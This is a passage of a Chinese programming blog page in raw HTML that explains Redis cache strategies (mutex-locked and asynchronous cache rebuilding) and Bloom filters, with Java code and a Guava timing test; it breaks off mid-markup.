</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ebb811198664-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">expire</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key_mutex</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">60</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ebb811198664-7\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">value</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">db</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ebb811198664-8\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">value</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ebb811198664-9\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">delete</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key_mutex</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ebb811198664-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ebb811198664-11\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">//其他线程休息50毫秒后重试  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ebb811198664-12\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">Thread</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sleep</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">50</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ebb811198664-13\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ebb811198664-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ebb811198664-15\"><span class=\"crayon-h\">  </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ebb811198664-16\"><span class=\"crayon-sy\">}</span><span class=\"crayon-h\">  </span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0029 seconds] -->\r\n<p><strong>优点:</strong></p>\n<ol>\n<li>思路简单</li>\n<li>保证一致性</li>\n</ol>\n<p><strong>缺点</strong></p>\n<ol>\n<li>代码复杂度增大</li>\n<li>存在死锁的风险</li>\n</ol>\n<h3 id=\"异步构建缓存\">2、异步构建缓存</h3>\n<p>在这种方案下，构建缓存采取异步策略，会从线程池中取线程来异步构建缓存，从而不会让所有的请求直接怼到数据库上。该方案redis自己维护一个timeout，当timeout小于System.currentTimeMillis()时，则进行缓存更新，否则直接返回value值。<br>\n集群环境的redis代码如下所示:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93038ebf796514285\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nString get(final String key) {  \r\n        V v = redis.get(key);  \r\n        String value = v.getValue();  \r\n        long timeout = v.getTimeout();  \r\n        if (v.timeout &lt;= System.currentTimeMillis()) {  \r\n            // 异步更新后台异常执行  \r\n            threadPool.execute(new Runnable() {  \r\n                public void run() {  \r\n                    String keyMutex = \"mutex:\" + key;  \r\n                    if (redis.setnx(keyMutex, \"1\")) {  \r\n                        // 3 min timeout to avoid mutex holder crash  \r\n                        redis.expire(keyMutex, 3 * 60);  \r\n                        String dbValue = db.get(key);  \r\n                        redis.set(key, dbValue);  \r\n                        redis.delete(keyMutex);  \r\n                    }  \r\n                }  \r\n            });  \r\n        }  \r\n        return value;  \r\n    }</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ebf796514285-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ebf796514285-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ebf796514285-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ebf796514285-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ebf796514285-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ebf796514285-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ebf796514285-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ebf796514285-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ebf796514285-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ebf796514285-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ebf796514285-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ebf796514285-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ebf796514285-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ebf796514285-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ebf796514285-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ebf796514285-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ebf796514285-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ebf796514285-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ebf796514285-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ebf796514285-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ebf796514285-21\">21</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93038ebf796514285-1\"><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-m\">final</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ebf796514285-2\"><span class=\"crayon-h\">        </span><span class=\"crayon-i\">V</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">v</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ebf796514285-3\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">value</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">v</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getValue</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ebf796514285-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">timeout</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">v</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getTimeout</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ebf796514285-5\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">v</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">timeout</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">currentTimeMillis</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ebf796514285-6\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">// 异步更新后台异常执行  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ebf796514285-7\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">threadPool</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">execute</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Runnable</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ebf796514285-8\"><span class=\"crayon-h\">                </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">run</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ebf796514285-9\"><span class=\"crayon-h\">                    </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">keyMutex</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"mutex:\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ebf796514285-10\"><span class=\"crayon-h\">                    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setnx</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">keyMutex</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"1\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ebf796514285-11\"><span class=\"crayon-h\">                        </span><span class=\"crayon-c\">// 3 min timeout to avoid mutex holder crash  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ebf796514285-12\"><span class=\"crayon-h\">                        </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">expire</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">keyMutex</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">60</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ebf796514285-13\"><span class=\"crayon-h\">                        </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">dbValue</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">db</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ebf796514285-14\"><span class=\"crayon-h\">                        </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">dbValue</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ebf796514285-15\"><span class=\"crayon-h\">                        </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">delete</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">keyMutex</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ebf796514285-16\"><span class=\"crayon-h\">                    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ebf796514285-17\"><span class=\"crayon-h\">                </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ebf796514285-18\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ebf796514285-19\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ebf796514285-20\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">value</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ebf796514285-21\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0042 seconds] -->\r\n<p><strong>优点:</strong></p>\n<ol>\n<li>性价最佳，用户无需等待</li>\n</ol>\n<p><strong>缺点</strong></p>\n<ol>\n<li>无法保证缓存一致性</li>\n</ol>\n<h3 id=\"布隆过滤器\">3、布隆过滤器</h3>\n<h4 id=\"原理\">1、原理</h4>\n<p>布隆过滤器的巨大用处就是，能够迅速判断一个元素是否在一个集合中。因此他有如下三个使用场景:</p>\n<ol>\n<li>网页爬虫对URL的去重，避免爬取相同的URL地址</li>\n<li>反垃圾邮件，从数十亿个垃圾邮件列表中判断某邮箱是否垃圾邮箱（同理，垃圾短信）</li>\n<li>缓存击穿，将已存在的缓存放到布隆过滤器中，当黑客访问不存在的缓存时迅速返回避免缓存及DB挂掉。</li>\n</ol>\n<p>OK，接下来我们来谈谈布隆过滤器的原理<br>\n其内部维护一个全为0的bit数组，需要说明的是，布隆过滤器有一个误判率的概念，误判率越低，则数组越长，所占空间越大。误判率越高则数组越小，所占的空间越小。</p>\n<p>假设，根据误判率，我们生成一个10位的bit数组，以及2个hash函数（(f_1,f_2)），如下图所示(生成的数组的位数和hash函数的数量，我们不用去关心是如何生成的，有数学论文进行过专业的证明)。<br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/6aa626ab277b7657acfdd791d67b2af4.png\" alt=\"image\"></p>\n<p>假设输入集合为((N_1,N_2)),经过计算(f_1(N_1))得到的数值得为2，(f_2(N_1))得到的数值为5，则将数组下标为2和下表为5的位置置为1，如下图所示<br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/9dacf0001bc1cd6cb26465d1b752b95f.png\" alt=\"image\"></p>\n<p>同理，经过计算(f_1(N_2))得到的数值得为3，(f_2(N_2))得到的数值为6，则将数组下标为3和下表为6的位置置为1，如下图所示<br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/75b9db0a2fee851bec9d7f6ac505bc63.png\" alt=\"image\"></p>\n<p>这个时候，我们有第三个数(N_3)，我们判断(N_3)在不在集合((N_1,N_2))中，就进行(f_1(N_3)，f_2(N_3))的计算</p>\n<ol>\n<li>若值恰巧都位于上图的红色位置中，我们则认为，(N_3)在集合((N_1,N_2))中</li>\n<li>若值有一个不位于上图的红色位置中，我们则认为，(N_3)不在集合((N_1,N_2))中</li>\n</ol>\n<p>以上就是布隆过滤器的计算原理，下面我们进行性能测试，</p>\n<h4 id=\"性能测试\">2、性能测试</h4>\n<p>代码如下:</p>\n<h5 id=\"新建一个maven工程引入guava包\">(1)新建一个maven工程，引入guava包</h5>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93038ec5038837511\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n&lt;dependencies&gt;  \r\n        &lt;dependency&gt;  \r\n            &lt;groupId&gt;com.google.guava&lt;/groupId&gt;  \r\n            &lt;artifactId&gt;guava&lt;/artifactId&gt;  \r\n            &lt;version&gt;22.0&lt;/version&gt;  \r\n        &lt;/dependency&gt;  \r\n    &lt;/dependencies&gt;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ec5038837511-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ec5038837511-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ec5038837511-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ec5038837511-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ec5038837511-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ec5038837511-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ec5038837511-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93038ec5038837511-1\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">dependencies</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ec5038837511-2\"><span class=\"crayon-h\">        </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">dependency</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ec5038837511-3\"><span class=\"crayon-h\">            </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">groupId</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">google</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">guava</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">groupId</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ec5038837511-4\"><span class=\"crayon-h\">            </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">artifactId</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-v\">guava</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">artifactId</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ec5038837511-5\"><span class=\"crayon-h\">            </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">version</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-cn\">22.0</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">version</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ec5038837511-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dependency</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ec5038837511-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dependencies</span><span class=\"crayon-o\">&gt;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p></p>\n<h5 id=\"测试一个元素是否属于一个百万元素集合所需耗时\">(2)测试一个元素是否属于一个百万元素集合所需耗时</h5>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93038ec8921125516\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npackage bloomfilter;\r\n\r\nimport com.google.common.hash.BloomFilter;\r\nimport com.google.common.hash.Funnels;\r\nimport java.nio.charset.Charset;\r\n\r\npublic class Test {\r\n    private static int size = 1000000;\r\n\r\n    private static BloomFilter&lt;Integer&gt; bloomFilter = BloomFilter.create(Funnels.integerFunnel(), size);\r\n\r\n    public static void main(String[] args) {\r\n        for (int i = 0; i &lt; size; i++) {\r\n            bloomFilter.put(i);\r\n        }\r\n        long startTime = System.nanoTime(); // 获取开始时间\r\n        \r\n        //判断这一百万个数中是否包含29999这个数\r\n        if (bloomFilter.mightContain(29999)) {\r\n            System.out.println(\"命中了\");\r\n        }\r\n        long endTime = System.nanoTime();   // 获取结束时间\r\n\r\n        System.out.println(\"程序运行时间： \" + (endTime - startTime) + \"纳秒\");\r\n\r\n    }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table 